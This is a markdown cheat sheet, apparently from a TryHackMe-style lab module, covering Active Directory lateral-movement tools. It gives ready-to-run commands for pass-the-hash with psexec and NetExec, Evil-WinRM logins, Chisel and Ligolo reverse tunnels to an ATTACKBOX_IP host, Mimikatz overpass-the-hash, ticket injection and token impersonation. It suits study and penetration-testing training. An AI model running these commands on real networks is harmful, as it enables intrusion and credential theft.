# 🛠️ Intro to AD Lateral Movement — Tools

> **Purpose:** Consolidated tool reference for all tools and commands appearing across this module.

---

# 📊 Tool Overview

| Tool | Primary Use |
|---|---|
| **Impacket** | Remote execution, authentication and AD operations |
| `psexec.py` | SMB-based remote execution |
| `wmiexec.py` | WMI-based remote execution |
| `smbexec.py` | SMB/service-based execution |
| `dcomexec.py` | DCOM-based execution |
| `atexec.py` | Scheduled-task remote execution |
| **NetExec (`nxc`)** | Authentication checks, command execution and hash spraying |
| **Evil-WinRM** | WinRM PowerShell sessions |
| **SSH** | Local/dynamic port forwarding and pivoting |
| **ProxyChains** | Routes compatible TCP applications through SOCKS |
| **xfreerdp** | RDP access |
| **Chisel** | HTTP-based tunnelling |
| **Ligolo-ng** | TUN-based network pivoting |
| **Mimikatz** | Kerberos/ticket and credential operations |
| **Rubeus** | Kerberos ticket operations |
| **Incognito** | Access-token enumeration/impersonation |
| **Sysmon** | Process and endpoint telemetry |

---

# 1️⃣ Impacket

Python-based toolkit containing multiple remote execution tools.

### `psexec.py`

```bash
psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
```

Pass-the-Hash:

```bash
psexec.py -hashes :<NT_HASH> Administrator@192.168.13.51
```

### `wmiexec.py`

Uses WMI/DCOM for remote execution.

### `smbexec.py`

Uses SMB and a service-based execution method.

### `dcomexec.py`

Uses DCOM objects for execution.

### `atexec.py`

Uses Task Scheduler RPC.

---

# 2️⃣ NetExec

Command:

```bash
nxc
```

Admin validation:

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc
```

Hash spraying / local authentication:

```bash
nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H <NT_HASH> --local-auth
```

Command execution:

```bash
nxc smb TARGET -x 'whoami /all'
```

PowerShell:

```bash
nxc smb TARGET -X '$PSVersionTable'
```

---

# 3️⃣ Evil-WinRM

Password authentication:

```bash
evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
```

Hash authentication:

```bash
evil-winrm -i TARGET -u Administrator -H <NT_HASH>
```

---

# 4️⃣ SSH

Local forwarding:

```bash
ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
```

Dynamic SOCKS forwarding:

```bash
ssh -f -D 1080 jdoe@192.168.13.71 -N
```

---

# 5️⃣ ProxyChains

Configure:

```text
socks4 127.0.0.1 1080
```

Route curl:

```bash
proxychains curl -s http://192.168.13.71
```

Route NetExec:

```bash
proxychains nxc smb 192.168.13.100 -u Administrator -H <HASH>
```

Route PsExec:

```bash
proxychains psexec.py -hashes :<HASH> thm.loc/Administrator@192.168.13.100
```

---

# 6️⃣ xfreerdp

Connect through an SSH local forward:

```bash
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'NotTheCorrectPassword' /cert:ignore
```

---

# 7️⃣ Chisel

AttackBox server:

```bash
chisel server --port 8080 --reverse
```

Pivot host:

```cmd
chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
```

---

# 8️⃣ Ligolo-ng

Proxy:

```bash
sudo ./proxy -selfcert
```

Agent:

```bash
./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT
```

Route:

```bash
sudo ip route add 192.168.13.0/24 dev ligolo
```

---

# 9️⃣ Mimikatz

Pass-the-Ticket:

```text
kerberos::ptt ticket.kirbi
```

Overpass-the-Hash:

```text
sekurlsa::pth /user:Administrator /domain:thm.loc /ntlm:<NT_HASH> /run:cmd.exe
```

---

# 🔟 Rubeus

Pass-the-Ticket:

```text
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

# 1️⃣1️⃣ Incognito

Meterpreter:

```text
use incognito
```

List tokens:

```text
list_tokens -u
```

Impersonate:

```text
impersonate_token "THM\\Administrator"
```

---

# 1️⃣2️⃣ Sysmon

Useful telemetry from the supplied material:

```text
Event ID 1
→ Process creation

Event ID 10
→ Process access
```

Event ID 10 can help identify unexpected access to `lsass.exe`.

---

# 📌 Quick Revision

```text
PsExec
→ SMB + service + SYSTEM

Evil-WinRM
→ WinRM + PowerShell

NetExec
→ Authentication / admin checks / execution

SSH -L
→ One specific forwarded service

SSH -D
→ SOCKS proxy

ProxyChains
→ Route TCP tools through SOCKS

Chisel
→ HTTP tunnelling

Ligolo-ng
→ TUN-based pivot

Mimikatz
→ Kerberos / credential operations

Rubeus
→ Kerberos

Incognito
→ Token impersonation

Sysmon
→ Detection / telemetry
```

---

# ⚠️ Authorisation

These commands can provide remote execution, credential reuse or privileged access. Use them only against systems and labs where you have explicit permission.
